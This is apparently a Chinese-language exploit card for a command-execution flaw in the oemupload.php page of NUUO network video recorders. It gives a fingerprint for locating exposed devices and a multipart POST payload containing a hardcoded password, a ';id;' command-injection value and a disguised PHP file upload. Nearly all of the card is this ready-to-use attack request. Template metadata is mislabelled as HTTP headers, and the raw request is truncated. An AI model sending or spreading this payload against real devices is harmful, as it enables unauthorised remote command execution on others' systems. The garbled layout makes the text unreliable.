# NUUOoemupload.php存在命令执行漏洞

- **系统**：NUUOoemupload.php　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`title="Network Video Recorder Login "`
- **请求**：`POST /oemupload.php HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryYrqVrkjR…`　`Content-Length: 375`　`id: nuuo-nvr-oemupload-uploadfile`　`name: nuuo-nvr-oemupload-uploadfile`　`author: unknown`　`severity: high`　`tags: nuuo, rce`

**请求体 / payload**
```
------WebKitFormBoundaryYrqVrkjRl2AHEKXG
Content-Disposition: form-data; name="pwd"
nvrmini2260
------WebKitFormBoundaryYrqVrkjRl2AHEKXG
Content-Disposition: form-data; name="url"
;id;
------WebKitFormBoundaryYrqVrkjRl2AHEKXG
Content-Disposition: form-data; name="file"; filename="33.php"
Content-Type: audio/mp3
1
------WebKitFormBoundaryYrqVrkjRl2AHEKXG--
- raw:
-
Host: [Target Host]
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryYrqVrkjRl2AHEKXG
Content-Length: 428
------WebKitFormBoundaryYrqVrkjRl2AHEKXG
Content-Disposition: form-data; name="pwd"
nvrmini2260
------WebKitFo…（脚本共 1042 字，完整版见原文）
```
- **预期**：200　|　—